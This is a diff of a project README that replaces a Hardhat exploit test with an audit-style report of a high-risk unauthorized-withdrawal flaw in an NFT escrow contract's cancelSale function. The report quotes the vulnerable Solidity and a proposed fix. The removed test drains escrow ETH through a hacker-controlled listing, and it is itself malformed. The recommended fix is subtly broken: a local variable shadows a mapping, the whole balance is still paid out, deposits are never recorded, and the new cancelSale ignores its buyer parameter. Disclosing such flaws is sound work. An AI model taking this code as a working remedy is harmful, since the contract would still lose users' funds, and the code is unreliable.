@@ -30,85 +30,118 @@ In a separate terminal execute:
 ### 7. Start frontend
 `$ npm run start`
 
-## Mishandling of ETH Vulnerability
+---
+
+# Mishandling of ETH Vulnerability
+
+## Contest Summary 
+Date: April 20th 2024
+
+## Results Summary
+Number of findings:
+High: 1
+Medium: 0
+Low: 0
+
+## High Risk Findings
+H-01. unauthorized withdrawals.
 
 ### Summary
-This vulnerability led to unauthorized ETH withdrawals during sale cancellations, as shown in the provided proof of concept (POC).
+The cancelSale function allows unauthorized ETH withdrawals due to the absence of a mechanism to track who deposited funds, potentially leading to loss of funds.
 
-<details>
-<summary>Click to view the Proof of Concept</summary>
+### Vulnerability Details:
+The cancelSale and finalizeSale functions are critical to the sale process. The cancelSale function transfers the entire contract balance to either the buyer or seller based on inspection status, while the finalizeSale function completes the sale only if all approvals are met. However, the lack of tracking for deposited amounts leads to potential unauthorized withdrawals.
 
-```javascript
-describe("ETH Mishandling in Cancel Sale", () => {
-    describe("Failure", async () => {
-        it("Check for deposit earnest", async () => {
-            const nftId_1 = 1
-            const nftId_2 = 2
+### POC
+```solidity
+function cancelSale(uint256 _nftID) public {
+        if (inspectionPassed[_nftID] == false) {
+            payable(buyer[_nftID]).transfer(address(this).balance);
+        } else {
+            payable(seller).transfer(address(this).balance);
+        }
+    }
 
-            // Deposit for NFT 1
-            const depositTx = await escrow.connect(buyer).depositEarnest(1, {
-                value: tokens(5)
-            })
-            await depositTx.wait()
+function finalizeSale(uint256 _nftID) public {
+        require(inspectionPassed[_nftID]);
+        require(approval[_nftID][buyer[_nftID]]);
+        require(approval[_nftID][seller]);
+        require(approval[_nftID][lender]);
+        require(address(this).balance >= purchasePrice[_nftID]);
+        isListed[_nftID] = false;
+        (bool success, ) = payable(seller).call{value: address(this).balance}(
+            ""
+        );
+        require(success);
+        IERC721(nftAddress).transferFrom(address(this), buyer[_nftID], _nftID);
+    }
+```
+### Impact
+Scenario 1:
+Buyer 1 deposited 1 ETH for NFT 1, while Buyer 2 did not deposit for NFT 2.
+Scenario 2:
+Buyer 2 exploited a vulnerability to cancel the sale, risking theft from Buyer 1.
 
-            // Escrow balance before
-            const escrowBalanceBefore = await escrow.getBalance()
+### Tools Used
+### Sublime Text, Hardhat
 
-            // Hacker balance before
-            const hackerBalanceBefore = await hre.ethers.provider.getBalance(
-                hacker.address)
+### Recommendations  
+ Add a new mapping: 
+``` solidity
 
-            // Inspector passes inspection for NFT 1
-            const inspectionTx1 = await escrow.connect(inspector).updateInspectionStatus(1, true)
-            await inspectionTx1.wait()
+mapping(address => uint256) public deposited;
 
-            // Approve sale by buyer, seller and lender for NFT 1
-            const approveTx1 = await escrow.connect(buyer).approveSale(1)
-            await approveTx1.wait()
+function finalizeSale(uint256 _nftID) public {
+        uint256 escrowAmount = escrowAmount[_nftID];
+        address buyerAddress = buyer[_nftID];
+        uint256 depositedAmount = deposited[buyerAddress];
+        
+        // Ensure buyer has enough funds deposited
+        require(deposited[buyerAddress] >= escrowAmount, "Escrow: Insufficient deposited funds");
 
-            const approveTx2 = await escrow.connect(seller).approveSale(1)
-            await approveTx2.wait()
+        // NFT passed inspection
+        require(inspectionPassed[_nftID], "Escrow: NFT inspection not passed");
 
-            const approveTx3 = await escrow.connect(lender).approveSale(1)
-            await approveTx3.wait()
+        // Buyer approval required
+        require(approval[_nftID][buyer[_nftID]], "Escrow: Buyer not approved");
 
-            // Lender send ETH to the contract for NFT 1
-            const inspectionTx2 = await lender.sendTransaction({
-                to: escrow.address,
-                value: tokens(5)
-                })
+        // Seller approval required
+        require(approval[_nftID][seller], "Escrow: Seller not approved");
 
-            // Mint NFT 2
-            const mintTx2 = await realEstate.connect(seller).mint("https://ipfs.io/ipfs/QmTudSYeM7mz3PkYEWXWqPjomRPHogcMFSq7XAvsvsgAPS")
-            await mintTx2.wait()
+        // Lender approval required
+        require(approval[_nftID][lender], "Escrow: Lender not approved");
 
-            // Approve NFT 2 for Escrow
-            const approveTx = await realEstate.connect(seller).approve(escrow.address, 2);
-            await approveTx.wait()
+        // Contract balance insufficient for purchase
+        require(address(this).balance >= escrowAmount, "Escrow: Insufficient balance");
 
-            // List NFT 2
-            const listTransaction2 = await escrow.connect(seller).list(
-                2, hacker.address, 
-                tokens(15), 
-                tokens(10))
-            await listTransaction2.wait()
+        // Transfer funds to the seller
+        isListed[_nftID] = false;
+          (bool success, ) = payable(seller).call{value: address(this).balance}(
+            ""
+        );
+        require(success);
 
-            // Hacker cancel sale for NFT 2
-            const cancelTx = await escrow.connect(hacker).cancelSale(2);
-            await cancelTx.wait()
+          // Reset deposited amount
+        deposited[buyerAddress] = 0;
 
-            // Check Escrow balance after cancel sale   
-            expect(escrowBalanceAfter).to.equal(escrowBalanceBefore);
+        // Transfer the NFT ownership to the buyer
+        IERC721(nftAddress).transferFrom(address(this), buyerAddress, _nftID);
+    }
 
-            // Hacker balance after
-            const hackerBalanceAfter = await hre.ethers.provider.getBalance(hacker.address)
-            expect(hackerBalanceAfter).to.be.greaterThan(hackerBalanceBefore)
 
-            Finalize sale for NFT 1
-            await expect(escrow.connect(seller).finalizeSale(1))
-        })
-    })
-})
-````
-</details>
+function cancelSale(address _buyer, uint256 _nftID) public {    
+        uint256 refundAmount = deposited[_buyer];
+        require(refundAmount > 0, "Escrow: No deposited amount to finalize the sale");
+        deposited[_buyer] = 0;
+
+        if (inspectionPassed[_nftID] == false) {
+            payable(buyer[_nftID]).transfer(refundAmount);
+        } else {
+            payable(seller).transfer(refundAmount);
+        }
+    } 
+```
+
+
+
 
